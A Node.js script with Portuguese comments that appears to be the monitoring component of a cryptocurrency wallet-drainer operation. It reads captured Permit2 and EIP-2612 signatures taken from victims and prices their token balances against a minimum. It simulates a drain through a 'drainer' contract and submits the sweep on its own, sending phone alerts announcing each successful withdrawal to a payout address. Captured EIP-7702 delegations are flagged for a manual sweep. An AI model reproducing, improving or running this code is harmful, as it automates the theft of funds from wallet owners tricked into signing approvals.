/// Vigia captures/: avisa no celular, SIMULA antes de gastar gas e submete sozinho.
/// Uso: node ops/monitor.mjs [--once] [--min-usd 1]
/// Estado: .run/state.json  (status por arquivo; falha re-tenta com backoff, ate MAX_TENTATIVAS)
import { execFile } from "node:child_process";
import { existsSync, readFileSync, writeFileSync, readdirSync, mkdirSync } from "node:fs";
import { promisify } from "node:util";
import { JsonRpcProvider, Contract, getAddress, formatUnits } from "ethers";
import { alert } from "./alert.mjs";
import { drainer } from "./lib.mjs";

const run = promisify(execFile);
const ONCE = process.argv.includes("--once");
const argOf = (k, d) => {
  const i = process.argv.indexOf(k);
  return i > -1 ? Number(process.argv[i + 1]) : d;
};
const MIN_USD = argOf("--min-usd", Number(process.env.MIN_USD || 1));
const MAX_TENTATIVAS = 5;
const MIN_GAS_ETH = 0.0004;
const STATE = ".run/state.json";
const STABLES = new Set([
  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
  "0xdac17f958d2ee523a2206206994597c13d831ec7",
  "0x6b175474e89094c44da98b954eedeac495271d0f",
]);
const WETH = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
const WBTC = "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599";
mkdirSync(".run", { recursive: true });

const env = Object.fromEntries(
  (existsSync(".env") ? readFileSync(".env", "utf8") : "")
    .split("\n")
    .map((l) => l.match(/^\s*([A-Z0-9_]+)\s*=\s*"?([^"\n]*)"?\s*$/))
    .filter(Boolean)
    .map((m) => [m[1], m[2]]),
);
const provider = new JsonRpcProvider(process.env.RPC_URL || env.RPC_URL, 1, { staticNetwork: true });
const DEP = existsSync(".deployments.json") ? JSON.parse(readFileSync(".deployments.json", "utf8")) : {};
const ERC20 = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
];

const loadState = () => {
  const s = existsSync(STATE) ? JSON.parse(readFileSync(STATE, "utf8")) : { files: {} };
  if (Array.isArray(s.done)) s.files = Object.fromEntries(s.done.map((f) => [f, { status: "teste", attempts: 0 }]));
  return s;
};
const saveState = (s) => writeFileSync(STATE, JSON.stringify(s, null, 2));

let px = { eth: 0, btc: 0, at: 0 };
async function price(force = false) {
  if (!force && Date.now() - px.at < 600_000) return px;
  try {
    const j = await (await fetch("https://api.coingecko.com/api/v3/simple/price?ids=ethereum,bitcoin&vs_currencies=usd")).json();
    px = { eth: j.ethereum?.usd ?? 0, btc: j.bitcoin?.usd ?? 0, at: Date.now() };
  } catch {}
  return px;
}

const PERMIT_TYPES = {
  PermitDetails: [
    { name: "token", type: "address" },
    { name: "amount", type: "uint160" },
    { name: "expiration", type: "uint48" },
    { name: "nonce", type: "uint48" },
  ],
  PermitBatch: [
    { name: "details", type: "PermitDetails[]" },
    { name: "spender", type: "address" },
    { name: "sigDeadline", type: "uint256" },
  ],
};
const now = () => Math.floor(Date.now() / 1000);
const batchFrom = (cap) => ({
  details: (cap.details ?? []).map((d) => ({ token: getAddress(d.token), amount: BigInt(d.amount), expiration: Number(d.expiration), nonce: Number(d.nonce) })),
  spender: getAddress(cap.drainer ?? DEP.drainer),
  sigDeadline: Number(cap.sigDeadline),
});

async function estimate(cap) {
  const owner = getAddress(cap.owner);
  const tokens = cap.kind === "permit2612" ? [cap.token] : (cap.details ?? []).map((d) => d.token);
  const p = await price();
  let usd = 0;
  const linhas = [];
  for (const t of tokens.slice(0, 25)) {
    try {
      const addr = getAddress(t);
      const c = new Contract(addr, ERC20, provider);
      const [bal, dec] = await Promise.all([c.balanceOf(owner), c.decimals().catch(() => 18)]);
      const sym = await c.symbol().catch(() => "?");
      const human = Number(formatUnits(bal, dec));
      if (human === 0) continue;
      const l = addr.toLowerCase();
      const v = STABLES.has(l) ? human : l === WETH ? human * p.eth : l === WBTC ? human * p.btc : 0;
      usd += v;
      linhas.push(`${sym} ${human < 1 ? human.toFixed(6) : human.toFixed(2)}`);
    } catch {}
  }
  return { usd, linhas };
}

async function simular(cap) {
  const d = drainer(provider, getAddress(cap.drainer ?? DEP.drainer));
  const owner = getAddress(cap.owner);
  const from = getAddress(DEP.operator); // onlyOperator: a simulacao precisa vir do operador
  if (cap.kind === "permit2") {
    await d.permit2Batch.staticCall(batchFrom(cap), owner, cap.signature, { from });
  } else {
    await d.permit2612.staticCall(getAddress(cap.token), owner, BigInt(cap.value), Number(cap.deadline), cap.signature, { from });
  }
}

async function enviar(file) {
  const { stdout, stderr } = await run("node", ["ops/submit.mjs", file], { cwd: process.cwd() });
  const m = (stdout + stderr).match(/tx (0x[0-9a-f]+)/i);
  return m ? m[1] : null;
}

async function checaGas() {
  const op = DEP.operator;
  if (!op) return;
  const bal = Number(formatUnits(await provider.getBalance(getAddress(op)), 18));
  if (bal < MIN_GAS_ETH) {
    const s = loadState();
    if (!s.gasAlert || Date.now() - s.gasAlert > 3_600_000) {
      await alert("OPERADOR SEM GAS", `saldo ${bal.toFixed(5)} ETH (min ${MIN_GAS_ETH}) — mande ETH para ${op}`, "fuelpump", "high");
      s.gasAlert = Date.now();
      saveState(s);
    }
  }
}

async function ciclo() {
  const state = loadState();
  const arquivos = readdirSync("captures").filter((f) => f.endsWith(".json")).sort();
  for (const f of arquivos) {
    const file = `captures/${f}`;
    const st = state.files[file] ?? { status: "novo", attempts: 0 };
    if (st.status === "ok" || st.status === "expirado" || st.status === "teste" || st.status === "abaixo-min" || st.status === "sim-falhou" || st.status === "sem-contrato" || st.status === "delegate") continue;
    if (st.status === "retry" && Date.now() < (st.next ?? 0)) continue;

    let cap;
    try {
      cap = JSON.parse(readFileSync(file, "utf8"));
    } catch {
      state.files[file] = { status: "teste", attempts: 0 };
      continue;
    }

    if (cap.kind === "delegate") {
      if (st.status === "novo") await alert("Delegação 7702 capturada (ação manual)", `${cap.owner} — o wallet nao aplicou o type-4\nrode: node ops/sweep7702.mjs ${cap.owner} (ou submit.mjs se tiver a chave)`, "link", "high");
      state.files[file] = { status: "delegate", attempts: 0 };
      continue;
    }
    if (!cap.signature || cap.signature.length < 20 || !["permit2", "permit2612"].includes(cap.kind)) {
      if (st.status === "novo") await alert(`Capture sem assinatura (${cap.kind})`, `${cap.owner} — ${file}`, "test_tube");
      state.files[file] = { status: "teste", attempts: 0 };
      continue;
    }

    const dl = cap.kind === "permit2" ? Number(cap.sigDeadline) : Number(cap.deadline);
    if (dl && dl < now()) {
      await alert("Assinatura EXPIRADA", `${cap.owner} — ${file} (deadline ${new Date(dl * 1000).toISOString()})`, "hourglass", "high");
      state.files[file] = { status: "expirado", attempts: st.attempts };
      continue;
    }

    // capture de deploy antigo/outra chain: o spender nao existe aqui -> nao ha o que submeter
    const spender = getAddress(cap.drainer ?? DEP.drainer);
    if ((await provider.getCode(spender)) === "0x") {
      if (st.status === "novo") await alert("Capture de outro deploy/chain", `${cap.owner} — spender ${spender} sem contrato aqui\n${file}`, "link", "low");
      state.files[file] = { status: "sem-contrato", attempts: st.attempts };
      continue;
    }

    const { usd, linhas } = await estimate(cap);
    if (usd < MIN_USD) {
      if (st.status === "novo") await alert("Assinatura recebida, abaixo do mínimo", `${cap.owner}\n~US$ ${usd.toFixed(2)} (${linhas.join(", ") || "saldo 0"})\nmin US$ ${MIN_USD} — nao submeti (vale 7 dias)`, "bell", "low");
      state.files[file] = { status: "abaixo-min", attempts: st.attempts, usd };
      continue;
    }

    try {
      await simular(cap);
    } catch (err) {
      // diagnostico: quem a assinatura diz ser, e o motivo decodificado
      let quem = "?";
      try {
        const { verifyTypedData } = await import("ethers");
        if (cap.kind === "permit2") {
          const b = batchFrom(cap);
          quem = verifyTypedData({ name: "Permit2", chainId: cap.chainId ?? 1, verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3" }, PERMIT_TYPES, b, cap.signature);
        }
      } catch {}
      const tent = st.attempts + 1;
      const sel = (err.data || err.info?.error?.data || "").slice(0, 10);
      await alert(`SIMULAÇÃO FALHOU (tentativa ${tent}/3, sem gastar gas)`, `${cap.owner}\n${linhas.join(", ")}\nmotivo: ${err.shortMessage || err.message}\nselector: ${sel}\nassinatura recupera para: ${quem}${quem.toLowerCase() === cap.owner.toLowerCase() ? " (bate com o owner)" : " *** NAO BATE COM O OWNER ***"}`, "warning", "high");
      state.files[file] = tent >= 3
        ? { status: "sim-falhou", attempts: tent, usd }
        : { status: "retry", attempts: tent, usd, next: Date.now() + 120_000 * tent };
      saveState(state);
      continue;
    }

    if (st.status === "novo") await alert(`Assinatura BOA: ~US$ ${usd.toFixed(2)}`, `${cap.owner}\n${linhas.join(", ")}\nsimulação ok, submetendo...`, "moneybag", "high");
    try {
      const tx = await enviar(file);
      await alert(`SAQUE FEITO: ~US$ ${usd.toFixed(2)}`, `${cap.owner}\n${linhas.join(", ")}\ntx ${tx}\n-> payout ${DEP.payout}`, "tada", "urgent");
      state.files[file] = { status: "ok", attempts: st.attempts + 1, usd, tx };
    } catch (err) {
      const tent = st.attempts + 1;
      const msg = (err.message || "").slice(0, 200);
      if (tent >= MAX_TENTATIVAS) {
        await alert("DESISTI de submeter", `${file} apos ${tent} tentativas\n${msg}`, "warning", "high");
        state.files[file] = { status: "sim-falhou", attempts: tent, usd };
      } else {
        await alert(`Falha ao submeter (tentativa ${tent}/${MAX_TENTATIVAS})`, `${file}\n${msg}\nvou tentar de novo`, "repeat", "default");
        state.files[file] = { status: "retry", attempts: tent, usd, next: Date.now() + 60_000 * tent };
      }
    }
    saveState(state);
  }
  saveState(state);
  await checaGas();
}

if (!alert.configured) console.log("aviso: ALERT_URL vazio — alertas so no log");
console.log(`monitor ativo | min US$ ${MIN_USD} | ${ONCE ? "uma passada" : "loop 20s"}`);
await ciclo();
if (!ONCE) setInterval(() => ciclo().catch((e) => console.log("erro ciclo:", e.message)), 20_000);
